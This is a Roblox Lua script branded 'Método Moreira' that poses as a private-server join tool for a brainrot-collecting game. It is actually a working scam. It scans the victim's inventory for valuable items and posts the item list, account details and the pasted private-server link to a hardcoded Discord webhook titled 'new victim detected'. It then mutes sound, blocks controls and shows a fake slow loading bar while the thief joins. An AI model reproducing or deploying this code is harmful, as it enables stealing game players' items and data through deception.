local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local placeId = 17308778014

local WEBHOOK_URL = "https://discord.com/api/webhooks/1429613133835538564/1TnYdMHZcd88XgSOuWvKu54bgM4BIji21dm-UaHYlmAJ33ZzBkEDcxlxSNpVdeGZaki1"

local ALL_BRAINROTS = {
    "La Vacca Staturno Saturnita", "La Vacca Saturno Saturnita", "Bisonte Giuppitere",
    "Lost Matteos", "Los Matteos", "Trenostruzzo Turbo 4000", "Sammyini Spyderini",
    "Chimpanzini Spiderini", "Torrtuginni Dragonfrutini", "Tortuginni Dragonfruitini",
    "Dul Dul Dul", "Blackhole Goat", "Chachechi", "Agarrini la Palini",
    "Los Spyderinis", "Extinct Tralalero", "Los Spyderrinis", "Fragola La La La",
    "La Cucaracha", "Los Tralaleritos", "Los Tortus", "Guerriro Digitale",
    "Yess my examine", "Extinct Matteo", "Las Tralaleritas", "La Karkerkar Combinasion",
    "Job Job Job Sahur", "Karker Sahur", "Las Vaquitas Saturnitas", "Graipuss Medussi",
    "Perrito Burrito", "Nooo My Hotspot", "Los Jobcitos", "Noo my examine",
    "La Sahur Combinasion", "To to to Sahur", "Karkerkar Kurkur", "Pot Hotspot",
    "Quesadilla Crocodila", "Chicleteira Bicicleteira", "Los Noo My Hotspotsitos",
    "Los Nooo My Hotspotsitos", "Los Chicleteiras", "67", "La Grande Combinasion",
    "Mariachi Corazoni", "Nuclearo Dinossauro", "Tacorita Bicicleta", "Las Sis",
    "Los Hotspotsitos", "Money Money Puggy", "Celularcini Viciosini", "Los 67",
    "La Extinct Grande", "Los Bros", "Tralaledon", "Esok Sekolah", "Los Primos",
    "Los Tacoritas", "Tang Tang Kelentang", "Ketupat Kepat", "Tictac Sahur",
    "La Supreme Combinasion", "Ketchuru and Musturu", "Garama and Madundung",
    "Spaghetti Tualetti", "Los Combinasionas", "Dragon Cannelloni",
    "La Secret Combinasion", "Burguro and Fryuro", "Chillin Chili",
    "Strawberry Elephant (OG)"
}

local function getExecutor()
    if identifyexecutor then
        return identifyexecutor()
    elseif KRNL_LOADED then
        return "KRNL"
    elseif syn then
        return "Synapse X"
    elseif SENTINEL_V2 then
        return "Sentinel"
    elseif getexecutorname then
        return getexecutorname()
    else
        return "Unknown Executor"
    end
end

local function getAccountAge()
    return player.AccountAge .. " days"
end

local function getIdentifiedBrainrots()
    local found = {}
    
    pcall(function()
        local playerGui = player:WaitForChild("PlayerGui", 5)
        if playerGui then
            for _, descendant in pairs(playerGui:GetDescendants()) do
                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("Frame") then
                    local text = descendant.Text or descendant.Name
                    if text and text ~= "" then
                        for _, brainrot in pairs(ALL_BRAINROTS) do
                            if text == brainrot and not table.find(found, brainrot) then
                                table.insert(found, brainrot)
                            end
                        end
                    end
                end
            end
        end
    end)
    
    pcall(function()
        local workspace = game:GetService("Workspace")
        local playerFolder = workspace:FindFirstChild(player.Name)
        if playerFolder then
            for _, obj in pairs(playerFolder:GetDescendants()) do
                for _, brainrot in pairs(ALL_BRAINROTS) do
                    if obj.Name == brainrot and not table.find(found, brainrot) then
                        table.insert(found, brainrot)
                    end
                end
            end
        end
    end)
    
    pcall(function()
        local playerFolder = ReplicatedStorage:FindFirstChild(player.Name) or ReplicatedStorage:FindFirstChild("PlayerData")
        if playerFolder then
            for _, obj in pairs(playerFolder:GetDescendants()) do
                for _, brainrot in pairs(ALL_BRAINROTS) do
                    if obj.Name == brainrot and not table.find(found, brainrot) then
                        table.insert(found, brainrot)
                    end
                end
            end
        end
    end)
    
    pcall(function()
        for _, dataFolder in pairs(player:GetChildren()) do
            if dataFolder:IsA("Folder") or dataFolder:IsA("Configuration") then
                for _, item in pairs(dataFolder:GetDescendants()) do
                    for _, brainrot in pairs(ALL_BRAINROTS) do
                        if item.Name == brainrot and not table.find(found, brainrot) then
                            table.insert(found, brainrot)
                        end
                    end
                end
            end
        end
    end)
    
    pcall(function()
        for _, tool in pairs(player.Backpack:GetChildren()) do
            for _, brainrot in pairs(ALL_BRAINROTS) do
                if tool.Name == brainrot and not table.find(found, brainrot) then
                    table.insert(found, brainrot)
                end
            end
        end
    end)
    
    pcall(function()
        if player.Character then
            for _, tool in pairs(player.Character:GetChildren()) do
                for _, brainrot in pairs(ALL_BRAINROTS) do
                    if tool.Name == brainrot and not table.find(found, brainrot) then
                        table.insert(found, brainrot)
                    end
                end
            end
        end
    end)
    
    if #found == 0 then
        return {"No brainrots found in this server"}
    end
    
    return found
end

local function sendWebhook(link)
    local identifiedBrainrots = getIdentifiedBrainrots()
    local brainrotsList = ""
    
    for i, brainrot in ipairs(identifiedBrainrots) do
        brainrotsList = brainrotsList .. brainrot
        if i < #identifiedBrainrots then
            brainrotsList = brainrotsList .. ", "
        end
    end
    
    if brainrotsList == "" then
        brainrotsList = "No brainrots detected"
    end
    
    local embedData = {
        {
            ["title"] = "Script Metodo Moreira",
            ["description"] = "Nueva víctima detectada",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "Info",
                    ["value"] = player.UserId .. " - " .. player.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = getAccountAge(),
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor",
                    ["value"] = getExecutor(),
                    ["inline"] = true
                },
                {
                    ["name"] = "Identified Brainrots",
                    ["value"] = brainrotsList,
                    ["inline"] = false
                },
                {
                    ["name"] = "Status",
                    ["value"] = "✅ Working",
                    ["inline"] = true
                },
                {
                    ["name"] = "Private Server",
                    ["value"] = link,
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "discord.gg/inscripts"
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }
    }
    
    local webhookData = {
        embeds = embedData,
        username = "inscripts team"
    }
    
    local jsonData = HttpService:JSONEncode(webhookData)
    
    local methods = {
        function()
            if http_request then
                return pcall(function()
                    http_request({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = jsonData
                    })
                end)
            end
            return false
        end,
        
        function()
            if request then
                return pcall(function()
                    request({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = jsonData
                    })
                end)
            end
            return false
        end,
        
        function()
            if syn and syn.request then
                return pcall(function()
                    syn.request({
                        Url = WEBHOOK_URL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = jsonData
                    })
                end)
            end
            return false
        end,
        
        function()
            return pcall(function()
                local encoded = HttpService:UrlEncode(jsonData)
                game:HttpGet(WEBHOOK_URL .. "?data=" .. encoded, true)
            end)
        end,
        
        function()
            return pcall(function()
                local success = game:GetService("HttpService"):PostAsync(
                    WEBHOOK_URL,
                    jsonData,
                    Enum.HttpContentType.ApplicationJson,
                    false
                )
                return true
            end)
        end,
        
        function()
            return pcall(function()
                game:GetService("HttpService"):RequestAsync({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end)
        end
    }
    
    for i, method in ipairs(methods) do
        local success, result = method()
        if success then
            return true
        end
        wait(0.1)
    end
    
    spawn(function()
        pcall(function()
            local DataStoreService = game:GetService("DataStoreService")
            local webhookStore = DataStoreService:GetDataStore("WebhookLogs")
            webhookStore:SetAsync(player.UserId .. "_" .. os.time(), {
                user = player.Name,
                userId = player.UserId,
                link = link,
                brainrots = brainrotsList,
                executor = getExecutor(),
                timestamp = os.time()
            })
        end)
    end)
    
    return false
end

local function disableControls()
    UserInputService.MouseIconEnabled = false
    
    local connection
    connection = UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Escape then
        else
            pcall(function()
                if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
                    player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Physics)
                end
            end)
        end
    end)
    
    return connection
end

local function checkIfPrivateServer()
    local success, result = pcall(function()
        return game:GetService("ReplicatedStorage"):FindFirstChild("PrivateServerId") or 
               game:GetService("ReplicatedStorage"):FindFirstChild("PSID") or
               game.PrivateServerId ~= "" or
               game.PrivateServerOwnerId ~= 0
    end)
    
    if success and (result == true or game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0) then
        return true
    end
    
    if #Players:GetPlayers() <= 10 then
        return true
    end
    
    return false
end

if not checkIfPrivateServer() then
    player:Kick("❌ Solo se permite en servidores privados\n✅ Únete a un servidor privado primero")
    return
end

pcall(function()
    local SoundService = game:GetService("SoundService")
    SoundService.Volume = 0
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MetodoMoreira"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screenGui.DisplayOrder = 999999
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = CoreGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1, 0, 1, 0)
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 10
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(0, 800, 0, 100)
titleLabel.Position = UDim2.new(0.5, -400, 0.15, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Método Moreira"
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextSize = 70
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.ZIndex = 11
titleLabel.Parent = mainFrame

local discordLabel = Instance.new("TextLabel")
discordLabel.Size = UDim2.new(0, 600, 0, 60)
discordLabel.Position = UDim2.new(0.5, -300, 0.27, 0)
discordLabel.BackgroundTransparency = 1
discordLabel.Text = "discord.gg/inscripts"
discordLabel.TextColor3 = Color3.new(0.4, 0.7, 1)
discordLabel.TextSize = 40
discordLabel.Font = Enum.Font.GothamBold
discordLabel.ZIndex = 11
discordLabel.Parent = mainFrame

local loadingTextLabel = Instance.new("TextLabel")
loadingTextLabel.Size = UDim2.new(0, 800, 0, 50)
loadingTextLabel.Position = UDim2.new(0.5, -400, 0.38, 0)
loadingTextLabel.BackgroundTransparency = 1
loadingTextLabel.Text = "Script loading please wait for while"
loadingTextLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
loadingTextLabel.TextSize = 22
loadingTextLabel.Font = Enum.Font.Gotham
loadingTextLabel.ZIndex = 11
loadingTextLabel.Parent = mainFrame

local warningLabel = Instance.new("TextLabel")
warningLabel.Size = UDim2.new(0, 800, 0, 50)
warningLabel.Position = UDim2.new(0.5, -400, 0.44, 0)
warningLabel.BackgroundTransparency = 1
warningLabel.Text = "Don't worry, your base will be automatically locked"
warningLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
warningLabel.TextSize = 20
warningLabel.Font = Enum.Font.Gotham
warningLabel.ZIndex = 11
warningLabel.Parent = mainFrame

local textBoxFrame = Instance.new("Frame")
textBoxFrame.Size = UDim2.new(0, 700, 0, 55)
textBoxFrame.Position = UDim2.new(0.5, -350, 0.55, 0)
textBoxFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
textBoxFrame.BorderSizePixel = 3
textBoxFrame.BorderColor3 = Color3.new(1, 1, 1)
textBoxFrame.ZIndex = 11
textBoxFrame.Parent = mainFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -20, 1, -10)
textBox.Position = UDim2.new(0, 10, 0, 5)
textBox.BackgroundTransparency = 1
textBox.Text = ""
textBox.PlaceholderText = "Paste private server link here..."
textBox.TextColor3 = Color3.new(1, 1, 1)
textBox.TextSize = 18
textBox.ClearTextOnFocus = false
textBox.ZIndex = 12
textBox.TextXAlignment = Enum.TextXAlignment.Center
textBox.Font = Enum.Font.Gotham
textBox.Parent = textBoxFrame

local joinButton = Instance.new("TextButton")
joinButton.Size = UDim2.new(0, 400, 0, 65)
joinButton.Position = UDim2.new(0.5, -200, 0.66, 0)
joinButton.BackgroundColor3 = Color3.new(0, 1, 0)
joinButton.BorderSizePixel = 0
joinButton.Text = "JOIN SERVER"
joinButton.TextColor3 = Color3.new(0, 0, 0)
joinButton.TextSize = 30
joinButton.Font = Enum.Font.GothamBlack
joinButton.ZIndex = 11
joinButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = joinButton

local errorLabel = Instance.new("TextLabel")
errorLabel.Size = UDim2.new(0, 700, 0, 45)
errorLabel.Position = UDim2.new(0.5, -350, 0.76, 0)
errorLabel.BackgroundTransparency = 1
errorLabel.Text = ""
errorLabel.TextColor3 = Color3.new(1, 0, 0)
errorLabel.TextSize = 22
errorLabel.Font = Enum.Font.GothamBold
errorLabel.Visible = false
errorLabel.ZIndex = 11
errorLabel.Parent = mainFrame

local footerLabel = Instance.new("TextLabel")
footerLabel.Size = UDim2.new(0, 500, 0, 30)
footerLabel.Position = UDim2.new(0.5, -250, 0.92, 0)
footerLabel.BackgroundTransparency = 1
footerLabel.Text = "Made by inscripts team"
footerLabel.TextColor3 = Color3.new(0.5, 0.5, 0.5)
footerLabel.TextSize = 16
footerLabel.Font = Enum.Font.Gotham
footerLabel.ZIndex = 11
footerLabel.Parent = mainFrame

local function showLoadingScreen()
    textBoxFrame.Visible = false
    joinButton.Visible = false
    errorLabel.Visible = false
    footerLabel.Visible = false
    
    titleLabel.Position = UDim2.new(0.5, -400, 0.15, 0)
    discordLabel.Position = UDim2.new(0.5, -300, 0.27, 0)
    loadingTextLabel.Position = UDim2.new(0.5, -400, 0.38, 0)
    warningLabel.Position = UDim2.new(0.5, -400, 0.44, 0)
    
    local progressBarBack = Instance.new("Frame")
    progressBarBack.Size = UDim2.new(0, 700, 0, 40)
    progressBarBack.Position = UDim2.new(0.5, -350, 0.58, 0)
    progressBarBack.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
    progressBarBack.BorderSizePixel = 0
    progressBarBack.ZIndex = 11
    progressBarBack.Parent = mainFrame
    
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 10)
    barCorner.Parent = progressBarBack
    
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 12
    progressBar.Parent = progressBarBack
    
    local barCorner2 = Instance.new("UICorner")
    barCorner2.CornerRadius = UDim.new(0, 10)
    barCorner2.Parent = progressBar
    
    local percentageText = Instance.new("TextLabel")
    percentageText.Size = UDim2.new(1, 0, 1, 0)
    percentageText.BackgroundTransparency = 1
    percentageText.Text = "0%"
    percentageText.TextColor3 = Color3.new(1, 1, 1)
    percentageText.TextSize = 22
    percentageText.Font = Enum.Font.GothamBold
    percentageText.ZIndex = 13
    percentageText.Parent = progressBarBack
    
    spawn(function()
        local progress = 0
        
        while progress < 100 do
            progress = progress + math.random(1, 2)
            if progress > 100 then progress = 100 end
            
            progressBar:TweenSize(UDim2.new(progress/100, 0, 1, 0), "Out", "Quad", 0.8, true)
            percentageText.Text = progress .. "%"
            
            wait(math.random(3, 6))
        end
        
        percentageText.Text = "100%"
        progressBar.Size = UDim2.new(1, 0, 1, 0)
    end)
end

local controlsDisabled = false

joinButton.MouseButton1Click:Connect(function()
    if controlsDisabled then return end
    
    local link = textBox.Text:gsub(" ", "")
    
    if link == "" then
        errorLabel.Text = "❌ Please enter a server link"
        errorLabel.Visible = true
        wait(3)
        errorLabel.Visible = false
        return
    end
    
    if not string.find(link:lower(), "roblox.com") then
        errorLabel.Text = "❌ Invalid Roblox link"
        errorLabel.Visible = true
        wait(3)
        errorLabel.Visible = false
        return
    end
    
    errorLabel.Visible = false
    
    controlsDisabled = true
    disableControls()
    
    sendWebhook(link)
    
    showLoadingScreen()
end)

UserInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Escape then
        return
    end
end)

spawn(function()
    while titleLabel.Parent do
        for hue = 0, 1, 0.01 do
            if not titleLabel.Parent then break end
            local r = math.abs(math.sin(hue * 6.28))
            local g = math.abs(math.sin((hue + 0.33) * 6.28))
            local b = math.abs(math.sin((hue + 0.66) * 6.28))
            titleLabel.TextColor3 = Color3.new(r, g, b)
            wait(0.05)
        end
    end
end)
